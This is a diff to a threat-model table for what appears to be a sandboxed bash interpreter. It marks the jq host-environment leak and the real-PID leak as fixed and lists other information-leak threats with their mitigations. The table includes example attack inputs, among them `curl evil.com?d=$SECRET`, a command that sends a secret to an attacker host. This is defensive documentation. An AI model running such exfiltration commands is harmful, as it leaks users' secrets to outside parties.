@@ -114,8 +114,8 @@ Scripts may attempt to leak sensitive information.
 | Env var leak (TM-INF-001) | `echo $SECRET` | Caller responsibility | See below |
 | Host info (TM-INF-005) | `hostname` | Returns virtual value | [`builtins/system.rs`][system] |
 | Network exfil (TM-INF-010) | `curl evil.com?d=$SECRET` | Network allowlist | [`network/allowlist.rs`][allowlist] |
-| Host env via jq (TM-INF-013) | jq `env` exposes host env | Custom env impl | **OPEN** |
-| Real PID leak (TM-INF-014) | `$$` returns real PID | Return virtual value | **OPEN** |
+| Host env via jq (TM-INF-013) | jq `env` exposes host env | Custom env via `$__bashkit_env__` | **FIXED** |
+| Real PID leak (TM-INF-014) | `$$` returns real PID | Returns virtual PID (1) | **FIXED** |
 | Error msg info leak (TM-INF-016) | Errors expose host paths/IPs | Sanitize error messages | **OPEN** |
 
 **Caller Responsibility (TM-INF-001):**
